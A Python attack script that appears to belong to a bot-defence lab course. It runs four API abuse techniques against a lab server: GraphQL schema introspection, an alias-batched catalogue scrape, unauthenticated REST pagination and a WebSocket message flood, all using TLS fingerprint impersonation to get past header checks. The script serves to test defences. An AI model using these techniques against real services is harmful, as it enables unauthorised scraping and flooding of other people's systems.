"""
Round 1 attack: API abuse, four ways (W3 Ch2). Level 5 stops them; level 4 does not.

Four cheap API attacks that the browser stack (levels 1 to 4) never sees, because none of them loads a page or runs
a line of JavaScript, and each is a Chrome-TLS client (curl_cffi, a perfect claimed JA4), so level 1's TLS and header
checks pass:

    introspection   POST a __schema query and get the whole API map in one trip
    batch           one POST that aliases product(...) 200 times: the catalogue scraped in a single request
    rest            walk /api/v1/products page by page with no token
    ws              open the price WebSocket and push messages as fast as it takes

Each technique runs in its own session. The checkpoint runs them one at a time (--technique); with no argument this
script runs all four and prints one summary.

    python attacks/round1_api.py [--technique introspection|batch|rest|ws]
"""

import argparse
import json
import sys

from websockets.sync.client import connect

from _api import BASE_URL, SKUS, Bot, Cost, emit, got_data, lab_headers, rng_for, say, verdict


def introspection(rng):
    bot = Bot("bot:round1_introspection", rng)
    r = bot.post("/graphql", json={"query": "{ __schema { queryType { name } types { name fields { name } } } }"})
    res = verdict(r)
    if r.status_code == 200 and "__schema" in r.text:
        res.update(status="reserved")
    return res


def batch(rng):
    bot = Bot("bot:round1_batch", rng)
    aliases = " ".join(f'p{i}: product(sku: "{sku}") {{ sku name price }}' for i, sku in enumerate(SKUS * 50))
    r = bot.post("/graphql", json=[{"query": "{ " + aliases + " }"}])
    res = verdict(r)
    if r.status_code == 200 and got_data(r):
        res.update(status="reserved")
    return res


def rest(rng):
    """Page the whole catalogue with no token. One refusal ends the walk."""
    bot = Bot("bot:round1_rest", rng)
    pages = 0
    for offset in range(0, 120, 24):
        r = bot.get(f"/api/v1/products?limit=24&offset={offset}")
        if r.status_code != 200:
            return dict(verdict(r), pages=pages)
        pages += 1
    return dict(verdict(r), status="reserved", pages=pages)


def ws(rng, messages=120):
    """Flood the price feed: 120 messages as fast as the socket answers. Cut off by the per-connection bucket at level 5."""
    ip = Bot("bot:round1_ws", rng).ip
    url = BASE_URL.replace("http://", "ws://", 1) + "/ws/price"
    answered = 0
    try:
        with connect(url, additional_headers=lab_headers("bot:round1_ws", ip), open_timeout=5, close_timeout=2) as sock:
            sock.recv(timeout=5)                                   # hello
            for _ in range(messages):
                sock.send(json.dumps({"sub": "price", "sku": "lab-runner-9"}))
                sock.recv(timeout=5)
                answered += 1
    except Exception:
        pass                                                       # the server hung up: the bucket ran dry
    flooded = answered >= messages
    return {"status": "reserved" if flooded else "blocked", "http": 101, "verdict": None, "answered": answered,
            "signals": [f"ws:{answered}/{messages} messages answered"]}


TECHNIQUES = {"introspection": introspection, "batch": batch, "rest": rest, "ws": ws}


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--technique", choices=sorted(TECHNIQUES))
    args = ap.parse_args()
    names = [args.technique] if args.technique else sorted(TECHNIQUES)
    print(f"=== Round 1: {', '.join(names)} ===")
    results = []
    with Cost() as cost:
        for name in names:
            result = TECHNIQUES[name](rng_for(f"round1-{name}"))
            results.append(result)
            say(name, result)
    emit("round1_" + (args.technique or "api"), results, cost)
    sys.exit(0)
